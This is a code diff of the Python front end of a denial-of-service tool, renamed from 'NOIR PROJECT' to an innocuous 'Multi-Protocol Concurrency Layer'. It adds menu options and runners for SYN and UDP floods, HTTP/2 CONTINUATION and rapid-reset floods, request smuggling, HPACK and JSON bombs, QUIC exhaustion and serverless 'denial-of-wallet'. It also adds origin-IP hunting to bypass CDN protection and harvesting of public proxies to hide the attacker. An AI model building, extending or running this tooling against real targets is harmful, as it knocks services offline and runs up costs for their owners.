-            if not target:
-                continue
-            await run_find_origin(target, env)
+            target = get_input(" Target IP/Host: ")
+            if not target: continue
+            await run_syn_flood(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "7":
+            target = get_input(" Target IP/Host: ")
+            if not target: continue
+            await run_udp_flood(target, cfg)
+            get_input(" Press Enter to continue...")
+        elif choice == "8":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            await run_seo_backheart(target, cfg)
+            if not target: continue
+            await run_mixed_attack(target, cfg)
+            get_input(" Press Enter to continue...")
+        elif choice == "9":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_auto_mode(target, cfg)
+            get_input(" Press Enter to continue...")
+        # Advanced 2027 attacks
+        elif choice == "A":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "cache-bypass", "Cache-Bypass POST Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "B":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "smuggling", "HTTP Request Smuggling")
+            get_input(" Press Enter to continue...")
+        elif choice == "C":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "hpack-bomb", "HPACK Compression Bomb")
+            get_input(" Press Enter to continue...")
+        elif choice == "D":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "continuation", "CONTINUATION Flood (CVE-2024-27316)")
+            get_input(" Press Enter to continue...")
+        elif choice == "E":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "settings-flood", "HTTP/2 SETTINGS Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "F":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "tls-reneg", "TLS Renegotiation Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "G":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "post-bomb", "POST Body Bomb (50MB)")
+            get_input(" Press Enter to continue...")
+        elif choice == "I":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "ws-storm", "WebSocket Connection Storm")
+            get_input(" Press Enter to continue...")
+        elif choice == "J":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_attack(target, cfg, "conn-flood", "TCP Connection Storm")
+            get_input(" Press Enter to continue...")
+        # Intelligent tools
+        elif choice == "H":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_origin_hunt(target, env)
+            get_input(" Press Enter to continue...")
+        elif choice == "P":
+            target = get_input(" Target URL (optional, for filtering): ")
+            await run_proxy_harvest(target if target else None)
+            get_input(" Press Enter to continue...")
+        # QUIC/HTTP/3 next-gen
+        elif choice == "Q":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_quic_attack(target, cfg, "quic-stream-hijack", "HTTP/3 Stream Hijack")
+            get_input(" Press Enter to continue...")
+        elif choice == "R":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_quic_attack(target, cfg, "quic-cid-flood", "QUIC Connection ID Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "S":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_quic_attack(target, cfg, "quic-crypto-exhaust", "QUIC Crypto Handshake Exhaustion")
+            get_input(" Press Enter to continue...")
+        # API Architecture attacks
+        elif choice == "T":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_api_attack(target, cfg, "api_rest_flood", "REST API Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "U":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_api_attack(target, cfg, "graphql_deep", "GraphQL Deep Nesting")
+            get_input(" Press Enter to continue...")
+        elif choice == "V":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_api_attack(target, cfg, "graphql_alias_bomb", "GraphQL Alias/Fragment Bomb")
+            get_input(" Press Enter to continue...")
+        elif choice == "W":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_api_attack(target, cfg, "grpc_flood", "gRPC Connection Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "X":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_api_attack(target, cfg, "json_bomb", "JSON/XML Parsing Bomb")
+            get_input(" Press Enter to continue...")
+        # Serverless / DoW
+        elif choice == "Y":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_dow_attack(target, cfg, "cold_start", "Serverless Cold Start Flood")
+            get_input(" Press Enter to continue...")
+        elif choice == "Z":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_dow_attack(target, cfg, "cost_accum", "Serverless Cost Accumulation (DoW)")
             get_input(" Press Enter to continue...")
         else:
             print(f" {c('r','[-]')} Invalid option.")
 
+async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
+    """Generic runner for advanced 2027 attacks with LIVE DASHBOARD"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" RPS / threads (default 1000): ") or "1000")
+    threads = int(get_input(" Workers (default 100): ") or "100")
+
+    # Auto-load saved origin if available
+    origin_ip = ""
+    try:
+        from core.recon.origin_store import load_hunt, get_best_origin, is_ip_address
+        # If user already gave bare IP as target, treat as origin already
+        if is_ip_address(target.replace("https://","").replace("http://","").split("/")[0]):
+            origin_ip = ""  # target IS the origin, no spoof needed
+            print(f" {c('y','[*]')} Target is bare IP - direct connection, no Host spoofing")
+        else:
+            saved = load_hunt(target)
+            if saved and (saved.get("verified_origins") or saved.get("candidates")):
+                best = get_best_origin(target)
+                if best:
+                    print(f" {c('g','[+]')} Found saved origin: {c('w', best)} (use this? [Y/n])")
+                    use_saved = get_input("   ").lower() != "n"
+                    if use_saved:
+                        origin_ip = best
+    except Exception:
+        pass
+
+    if not origin_ip:
+        use_origin = get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y"
+        if use_origin:
+            try:
+                from core.recon.origin_hunter import OriginHunter
+                env = load_env()
+                print(f" {c('c','[*]')} Hunting origin IP...")
+                hunter = OriginHunter(timeout=8)
+                report = await hunter.hunt(target, env=env)
+                if report.verified_origins:
+                    origin_ip = report.verified_origins[0]
+                    print(f" {c('g','[+]')} Origin found: {origin_ip}")
+                elif report.candidates:
+                    origin_ip = report.candidates[0].ip
+                    print(f" {c('y','[*]')} Best candidate: {origin_ip} ({report.candidates[0].confidence:.0%})")
+                else:
+                    print(f" {c('y','[!]')} No origin found - hitting CDN edge")
+            except Exception as e:
+                print(f" {c('y','[!]')} Origin hunt failed: {e}")
+
+    # Ask about proxies for ALL methods
+    use_proxy = get_input(" Use proxy pool? (y/N): ").lower() == "y"
+    proxy_pool = None
+    if use_proxy:
+        proxy_file = get_input(" Proxy file path (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
+        if not os.path.exists(proxy_file):
+            harvest = get_input(f" {proxy_file} not found. Auto-harvest? (Y/n): ").lower() != "n"
+            if harvest:
+                from core.network.proxy_harvester import auto_harvest_and_validate
+                print(f" {c('c','[*]')} Harvesting proxies...")
+                last_print = [0]
+                def progress(stage, current, alive):
+                    import time as _t
+                    now = _t.time()
+                    if now - last_print[0] < 0.5:
+                        return
+                    last_print[0] = now
+                    if stage == "validate":
+                        print(f"\r {c('c','[*]')} Validating: {current} | alive: {c('g',str(alive))}   ", end="", flush=True)
+                result = await auto_harvest_and_validate(
+                    target_url=target, save_path=proxy_file, min_rtt_ms=3000,
+                    progress_cb=progress,
+                )
+                print(f"\n {c('g','[+]')} {result['fast_alive']} fast proxies ready")
+                proxy_file_to_load = proxy_file
+            else:
+                proxy_file_to_load = None
+        else:
+            proxy_file_to_load = proxy_file
+
+        if proxy_file_to_load and os.path.exists(proxy_file_to_load):
+            from core.network.proxy import ProxyPool
+            proxy_pool = ProxyPool(connect_timeout=5)
+            count = await proxy_pool.load_file(proxy_file_to_load)
+            print(f" {c('g','[+]')} Loaded {count} proxies from {proxy_file_to_load}")
+
+    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | RPS={rps} threads={threads}")
+    if origin_ip:
+        print(f" {c('g','[+]')} Bypass mode via origin: {c('w', origin_ip)}")
+    if proxy_pool:
+        print(f" {c('g','[+]')} Proxy pool active: {proxy_pool.stats().get('total', 0)} proxies")
+    print(f" {c('m','=' * 70)}")
+
+    # Export proxy file for Go engine if proxy_pool exists
+    proxy_file_for_go = ""
+    if proxy_pool:
+        urls = []
+        for plist in proxy_pool._pools.values():
+            for ps in plist:
+                urls.append(ps.url)
+        if urls:
+            proxy_file_for_go = f"proxies/_temp_{method}.txt"
+            os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
+            with open(proxy_file_for_go, "w") as f:
+                f.write("\n".join(urls))
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=proxy_pool,
+        duration=duration, color_func=c,
+        origin_ip=origin_ip, profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method=method, threads=threads, origin_ip=origin_ip,
+            proxy_file=proxy_file_for_go, live_stats=vec
+        )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_quic_attack(target: str, cfg: dict, method: str, label: str):
+    """QUIC/HTTP/3 attacks with LIVE DASHBOARD"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
+    rps = int(get_input(f" Conn/s (default 500): ") or "500")
+    threads = int(get_input(f" Workers (default 50): ") or "50")
+    max_conns = int(get_input(f" Max concurrent (default 2000): ") or "2000")
+    
+    opts = await prompt_attack_options(target, ask_origin=False)
+
+    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps} threads={threads} maxc={max_conns}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('m','='*70)}")
+
+    # Export proxy file for Go engine if proxy_pool exists
+    proxy_file_for_go = ""
+    if opts["proxy_pool"]:
+        urls = []
+        for plist in opts["proxy_pool"]._pools.values():
+            for ps in plist:
+                urls.append(ps.url)
+        if urls:
+            proxy_file_for_go = f"proxies/_temp_{method}.txt"
+            os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
+            with open(proxy_file_for_go, "w") as f:
+                f.write("\n".join(urls))
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip="", profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method=method, threads=threads, proxy_file=proxy_file_for_go,
+            live_stats=vec
+        )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    
+    await dashboard.stop()
+    
+    print_attack_summary(target, duration, result)
+
+
+async def run_api_attack(target: str, cfg: dict, method: str, label: str):
+    """API attacks with LIVE DASHBOARD"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
+    rps = int(get_input(f" RPS (default 200): ") or "200")
+    
+    opts = await prompt_attack_options(target, ask_origin=False)
+
+    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('m','='*70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip="", profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        from core.attack.api_attacks import API_ATTACK_METHODS
+        func = API_ATTACK_METHODS.get(method)
+        if not func:
+            print(f" {c('r','[-]')} Unknown API attack: {method}")
+            await dashboard.stop()
+            return
+        result = await func(url=target, duration=duration, rps=rps, proxy_pool=opts["proxy_pool"], live_stats=vec)
+        vec["status"] = "done"
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+    
+    print_attack_summary(target, duration, result)
+
+
+async def run_dow_attack(target: str, cfg: dict, method: str, label: str):
+    """Serverless DoW attacks with LIVE DASHBOARD"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
+    rps = int(get_input(f" RPS (default 100): ") or "100")
+    
+    opts = await prompt_attack_options(target, ask_origin=False)
+
+    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps}")
+    print(f" {c('c','[*]')} Denial-of-Wallet: triggers auto-scaling, burns compute budget")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('m','='*70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip="", profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        from core.attack.serverless_dow import DOW_ATTACK_METHODS
+        func = DOW_ATTACK_METHODS.get(method)
+        if not func:
+            print(f" {c('r','[-]')} Unknown DoW attack: {method}")
+            await dashboard.stop()
+            return
+        result = await func(url=target, duration=duration, rps=rps, proxy_pool=opts["proxy_pool"], live_stats=vec)
+        vec["status"] = "done"
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+    
+    print_attack_summary(target, duration, result)
+
+
+async def run_origin_hunt(target: str, env: dict):
+    """Standalone origin IP hunting with auto-save"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    # Check for cached result first
+    try:
+        from core.recon.origin_store import load_hunt
+        cached = load_hunt(target)
+        if cached:
+            age_hours = (time.time() - cached.get("timestamp", 0)) / 3600
+            if age_hours < 24:
+                print(f" {c('y','[*]')} Found cached hunt ({age_hours:.1f}h old)")
+                use_cache = get_input("   Use cached result instead of re-hunting? (Y/n): ").lower() != "n"
+                if use_cache:
+                    print(f"\n {c('w','=' * 70)}")
+                    print(f" {c('w','  CACHED ORIGIN HUNT RESULTS')}")
+                    print(f" {c('w','=' * 70)}")
+                    print(f"  Target:           {cached['target']}")
+                    print(f"  Hunted at:        {cached['timestamp_human']}")
+                    print(f"  Verified origins: {c('g', str(len(cached['verified_origins'])))}")
+                    print(f"  Total candidates: {len(cached['candidates'])}")
+                    print(f" {c('d', '-' * 70)}")
+                    if cached['verified_origins']:
+                        print(f"  {c('g','VERIFIED ORIGINS:')}")
+                        for ip in cached['verified_origins']:
+                            print(f"    {c('g', ip)}")
+                    if cached['candidates']:
+                        print(f"\n  {c('y','TOP CANDIDATES:')}")
+                        for cand in cached['candidates'][:10]:
+                            ip = cand.get('ip', '')
+                            conf = cand.get('confidence', 0)
+                            src = cand.get('source', '')
+                            tag = c('g','VERIFIED') if cand.get('verified') else c('d','candidate')
+                            print(f"    {ip:20s}  conf={conf:.0%}  src={src}  [{tag}]")
+                    print(f" {c('w','=' * 70)}\n")
+                    return
+    except Exception:
+        pass
+
+    print(f"\n {c('c','[*]')} Hunting origin IP for: {target}")
+    print(f" {c('c','[*]')} This will scan 11 sources in parallel (10-30s)...")
+    print(f" {c('m','=' * 70)}")
+
+    try:
+        from core.recon.origin_hunter import OriginHunter, print_hunt_report
+        hunter = OriginHunter(timeout=10, max_concurrent=200)
+        report = await hunter.hunt(target, env=env)
+        print_hunt_report(report, color_func=c)
+
+        # auto-saved by hunter, just inform user
+        if report.candidates:
+            from core.recon.origin_store import _hostname_from_url, STORE_DIR
+            host = _hostname_from_url(target)
+            print(f" {c('g','[+]')} Auto-saved to: {STORE_DIR}/{host}.json")
+            print(f" {c('g','[+]')} Plain text:    {STORE_DIR}/{host}.txt")
+            print(f" {c('c','[*]')} Other attacks will auto-load this origin next time you target {host}")
+    except Exception as e:
+        print(f" {c('r','[-]')} Origin hunt failed: {e}")
+        import traceback
+        traceback.print_exc()
+
+async def run_proxy_harvest(target_url: str = None):
+    """Auto-harvest and validate fresh proxies"""
+    print(f"\n {c('c','[*]')} Auto-Harvesting Proxies")
+    print(f" {c('c','[*]')} Scraping from 25+ public sources in parallel")
+    if target_url:
+        print(f" {c('c','[*]')} Validating against: {target_url}")
+    print(f" {c('m','=' * 70)}")
+
+    try:
+        from core.network.proxy_harvester import auto_harvest_and_validate
+
+        last_print = [0]
+        def progress(stage, current, alive):
+            import time
+            now = time.time()
+            if now - last_print[0] < 0.5:
+                return
+            last_print[0] = now
+            if stage == "scrape":
+                print(f"\r {c('c','[*]')} Scraping proxy sources...                              ", end="", flush=True)
+            elif stage == "validate":
+                print(f"\r {c('c','[*]')} Validating: {current} checked, {c('g',str(alive))} alive   ", end="", flush=True)
+
+        result = await auto_harvest_and_validate(
+            target_url=target_url,
+            save_path="proxies/alive.txt",
+            min_rtt_ms=3000,
+            progress_cb=progress,
+        )
+
+        print()
+        print(f"\n {c('w','='*70)}")
+        print(f" {c('w','  PROXY HARVEST REPORT')}")
+        print(f" {c('w','='*70)}")
+        print(f"  Scraped:        {c('w', str(result['scraped']))} proxies")
+        print(f"  Alive:          {c('g', str(result['alive']))}")
+        print(f"  Fast (<3s):     {c('g', str(result['fast_alive']))}")
+        print(f"  Time elapsed:   {result['elapsed']}s")
+        print(f"  By type:        HTTP={result['by_type']['http']} SOCKS5={result['by_type']['socks5']} SOCKS4={result['by_type']['socks4']}")
+        print(f"  Saved to:       {c('g', result['save_path'])}")
+        if result['proxies']:
+            print(f"\n {c('y','TOP 10 FASTEST:')}")
+            for p in result['proxies'][:10]:
+                print(f"    {p['url']:50s}  rtt={p['rtt_ms']:.0f}ms  type={p['type']}")
+        print(f" {c('w','='*70)}\n")
+    except Exception as e:
+        print(f" {c('r','[-]')} Harvest failed: {e}")
+        import traceback
+        traceback.print_exc()
 
 async def main():
-    p = argparse.ArgumentParser(description="NOIR PROJECT v5.0 [2026]")
+    p = argparse.ArgumentParser(description=f"Multi-Protocol Concurrency Layer v{VERSION} [2026]")
     p.add_argument("--start", action="store_true", help="Interactive menu mode")
     p.add_argument("--target", "-t", default="")
-    p.add_argument("--method", "-m", default="", choices=["http_get_flood", "http_post_flood", "bypass_path_flood", "browser", "dynamic", "slow", "pps", "slowloris", "rudy", "udp_flood", "websocket", "graphql", "http3"])
-    p.add_argument("--v6", action="store_true", help="Use v6 enhanced engine with 2026 evasion techniques")
-    p.add_argument("--adaptive", action="store_true", help="Enable adaptive mode (auto-switch methods)")
+    p.add_argument("--method", "-m", default="",
+        choices=["http-flood", "http2-flood", "rapid-reset", "continuation",
+                 "slowloris", "syn-flood", "udp-flood", "proxy-flood",
+                 "post-bomb", "conn-flood", "amplification",
+                 "ws-storm", "settings-flood", "tls-reneg",
+                 "quic-stream-hijack", "quic-cid-flood", "quic-crypto-exhaust",
+                 "smuggling", "hpack-bomb", "cache-bypass",
+                 "mixed", "auto",
+                 "headers-flood", "cookie-bomb", "range-amp", "xmlrpc",
+                 "api-flood", "api-rest", "graphql", "graphql-deep",
+                 "grpc-flood", "json-bomb", "xml-bomb",
+                 "cold-start", "cost-accum", "websocket"])
     p.add_argument("--duration", "-d", type=int, default=0)
     p.add_argument("--rps", "-r", type=int, default=0)
-    p.add_argument("--tier", type=int, default=0, choices=[0, 1, 2, 3])
-    p.add_argument("--no-proxy", action="store_true", help="Direct attack without proxies")
-    p.add_argument("--origin-ip", nargs="?", const="auto", default=None)
-    p.add_argument("--proxy-type", choices=["mobile", "residential", "ipv6", "datacenter"], default="mobile")
-    p.add_argument("--smart", action="store_true", help="Smart endpoint discovery + rotation")
-    p.add_argument("--scan-only", action="store_true", help="Scan endpoints only, no attack (SEO mode)")
+    p.add_argument("--threads", "-T", type=int, default=0)
+    p.add_argument("--proxy-file", "-p", default="")
+    p.add_argument("--http2", action="store_true", help="Force HTTP/2")
+    p.add_argument("--rapid-reset", action="store_true", help="Enable HTTP/2 Rapid Reset")
+    p.add_argument("--go-engine", action="store_true", default=True, help="Use Go engine")
+    p.add_argument("--validate", action="store_true", help="Validate target downtime via external check")
+    p.add_argument("--origin-ip", default="")
     p.add_argument("--config", "-c", default="config/default.yaml")
     args = p.parse_args()
 
@@ -610,204 +2495,119 @@ async def main():
         print(f"  {c('r','Error:')} No target specified.")
         print(f"  Use --start for interactive menu, or -t TARGET for direct mode.\n")
 
-
 async def cmd_start(args, cfg):
     target = args.target
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    print("=" * 70)
-    print("  \033[1;37mNOIR\033[0m \033[1;31mPROJECT\033[0m | \033[1;90mTOTAL RECALL ENGINE v5.0 [2026]\033[0m")
-    print("=" * 70)
-    print(f" {c('c','[*]')} Target: {c('w',target)}")
+    banner()
+    print(f"  {c('c','[*]')} Target: {c('w', target)}")
+    print(f"  {c('c','[*]')} Method: {args.method or 'auto'}")
+    print(f"  {c('m','=' * 70)}")
 
-    env = load_env()
-    origin_ip = args.origin_ip
-    if origin_ip == "auto":
-        from core.intel_engine import TargetAnalyzer
-        from core.origin_finder import OriginFinder
-        print(f" {c('c','[*]')} Auto-discovering origin IP...")
-        ta = TargetAnalyzer()
-        prof = ta.analyze(target)
-        print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
-
-        if prof.is_behind_cdn:
-            print(f" {c('y','[*]')} Running advanced origin discovery...")
-            finder = OriginFinder()
-            report = finder.find_origin(
-                target,
-                censys_id=env.get("CENSYS_ID") or None,
-                censys_secret=env.get("CENSYS_SECRET") or None,
-                shodan_key=env.get("SHODAN_KEY") or None,
-                securitytrails_key=env.get("SECURITYTRAILS_KEY") or None,
-                zoomeye_key=env.get("ZOOMEYE_KEY") or None,
-                netlas_key=env.get("NETLAS_KEY") or None,
-            )
-            if report.verified_origin:
-                origin_ip = report.verified_origin
-                print(f" {c('g','[+]')} VERIFIED ORIGIN IP: {origin_ip}")
-            elif report.candidates:
-                origin_ip = report.candidates[0].ip
-                print(f" {c('y','[!]')} Most likely origin: {origin_ip} ({report.candidates[0].confidence:.0%})")
-                if len(report.candidates) > 1:
-                    print(f" {c('y','[!]')} Other candidates: {[c.ip for c in report.candidates[1:5]]}")
-            else:
-                origin_ip = prof.origin_ips[0] if prof.origin_ips else None
-                print(f" {c('r','[-]')} No advanced results, using basic discovery")
-        elif not prof.is_behind_cdn:
-            origin_ip = None
-            print(f" {c('g','[+]')} No CDN detected, using direct mode.")
-
-    proxy_pool = None
-    health_task = None
-    bg_task = None
-
-    if args.scan_only:
-        print(f" {c('g','[+]')} Scan-only mode: no proxies needed.")
-    elif args.no_proxy or origin_ip:
-        print(f" {c('g','[+]')} Direct mode: no proxies needed.")
-    else:
-        from core.proxy_engine import ProxyPool
-        proxy_pool = ProxyPool(connect_timeout=5,
-                                min_pool=cfg["proxy"]["min_pool"])
-        proxy_pool._validator.max_connect_time_ms = 5000
-        alive_path = "proxies/alive.txt"
-        if os.path.exists(alive_path):
-            total = await proxy_pool.load_file(alive_path)
-            if total == 0:
-                print(f" {c('r','[-]')} alive.txt empty. Run with --scan-only first or delete it.")
-                return
-            print(f" {c('g','[+]')} Loaded {total} alive proxies from {alive_path}")
-        else:
-            total = 0
-            for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
-                total += await proxy_pool.load_file(f)
-            jpath = "config/proxies.json"
-            if os.path.exists(jpath):
-                try:
-                    with open(jpath) as f:
-                        total += await proxy_pool.load(json.load(f))
-                except Exception:
-                    pass
-            if total == 0:
-                print(f" {c('r','[-]')} No proxies. Use --no-proxy.")
-                return
-            proxy_pool._validator.set_target(target)
-            print(f" {c('c','[*]')} Validating ALL {total} proxies against target...")
-            alive = await proxy_pool.quick_validate(total, concurrency=100)
-            if alive == 0:
-                print(f" {c('r','[-]')} No valid proxies. Use --no-proxy or --origin-ip.")
-                return
-            proxy_pool.save_alive(alive_path)
-            print(f" {c('g','[+]')} {alive} proxies ready. Saved to {alive_path}")
-        health_task = asyncio.create_task(proxy_pool.health_loop())
-        bg_task = None
-
-    proxy_type = args.proxy_type or "mobile"
-    start_tier = args.tier or (3 if origin_ip else (2 if proxy_pool else 1))
-
-    if args.scan_only:
-        args.smart = True
-
-    attack_plan = None
-    if args.smart:
-        from core.endpoint_engine import SmartEndpointDiscovery
-        print(f" {c('c','[*]')} Smart endpoint discovery...")
-        sd = SmartEndpointDiscovery()
-        endps = await sd.probe(target)
-        attack_plan = sd.generate_attack_plan()
-        print(f" {c('g','[+]')} {len(endps)} endpoints found, {len(attack_plan)} attack vectors")
-        for ep in endps[:6]:
-            tag = c('r','BLOCK') if ep.blocked else c('g','OK')
-            print(f"     {ep.method:6s} {ep.path:30s} {ep.status} {tag} {ep.body_len}b")
-        if len(endps) > 6:
-            print(f"     ... and {len(endps)-6} more")
-
-    if args.scan_only:
-        from core.endpoint_engine import SmartEndpointDiscovery
-        print(f"\n {c('c','='*70)}")
-        print(f" {c('w','  SEO SCAN REPORT')}")
-        print(f" {c('c','='*70)}")
-        print(f"  Target:  {target}")
-        print(f"  Scanned: {len(endps)} endpoints")
-        print(f" {c('d','-'*70)}")
-        for ep in endps:
-            tag = c('g','200 OK') if ep.status == 200 else (c('y',str(ep.status)) if ep.status else c('r','ERR'))
-            print(f"  {tag}  {ep.method:6s} {ep.path:40s} {ep.body_len:>6}b")
-        print(f" {c('d','-'*70)}")
-        ok_count = sum(1 for e in endps if e.status == 200)
-        block_count = sum(1 for e in endps if e.blocked)
-        print(f"  Accessible:  {ok_count}/{len(endps)}")
-        print(f"  Blocked:     {block_count}/{len(endps)}")
-        print(f"  Sitemap:     {'/sitemap.xml' if any(e.path=='/sitemap.xml' and e.status==200 for e in endps) else 'Not found'}")
-        print(f"  Robots:      {'/robots.txt' if any(e.path=='/robots.txt' and e.status==200 for e in endps) else 'Not found'}")
-        wp = [e for e in endps if 'wp-' in e.path.lower()]
-        print(f"  WordPress:   {len(wp)} paths detected")
-        print(f" {c('c','='*70)}")
-        return
-
-    from core.attack_engine import AttackEngine
-    engine = AttackEngine(
-        proxy_pool=proxy_pool,
-        no_proxy=args.no_proxy or bool(origin_ip),
-        origin_ip=origin_ip,
-        proxy_type=proxy_type,
-        initial_rps=args.rps or cfg["attack"]["initial_rps"],
-        start_tier=start_tier,
-        attack_plan=attack_plan,
-    )
-
-    method = args.method or cfg["attack"]["default_method"]
     duration = args.duration or cfg["attack"]["default_duration"]
+    rps = args.rps or cfg["attack"]["initial_rps"]
+    method = args.method or "auto"
 
-    print(f" {c('c','[*]')} Tier: {start_tier} | Method: {method} | Duration: {duration}s | RPS: {args.rps or cfg['attack']['initial_rps']}")
-    print(f" {c('m','=' * 70)}")
+    # CLI direct mode - no interactive prompts
+    if method == "auto":
+        # Smart auto mode
+        profile = await auto_detect_target(target, verbose=True)
+        if profile is None:
+            print(f" {c('r','[-]')} Auto-detect failed")
+            return
 
-    start = time.time()
-    attack = asyncio.create_task(engine.start_attack(target, duration, method, args.rps or cfg["attack"]["initial_rps"]))
-    hb = asyncio.create_task(heartbeat(engine, duration))
-    await attack
-    await hb
+        if profile.supports_http2:
+            print(f" {c('g','[+]')} Using RAPID-RESET (HTTP/2 detected)")
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="http-flood", rapid_reset=True
+            )
+        else:
+            print(f" {c('g','[+]')} Using HTTP-FLOOD (HTTP/1.1)")
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="http-flood"
+            )
+    elif method in ("http-flood", "http2-flood", "rapid-reset"):
+        # Smart layer7 with auto-detect
+        result = await smart_layer7_attack(
+            target=target, duration=duration, rps=rps,
+            user_method=method, proxy_file=args.proxy_file, cfg=cfg
+        )
+    elif method == "slowloris":
+        from core.attack.enhanced import run_enhanced_attack
+        result = await run_enhanced_attack(
+            url=target, duration=duration, method="slowloris", rps=rps
+        )
+    elif method == "syn-flood":
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps, method="syn-flood"
+        )
+    elif method == "udp-flood":
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps, method="udp-flood"
+        )
+    elif method == "proxy-flood":
+        from core.network.proxy import ProxyPool
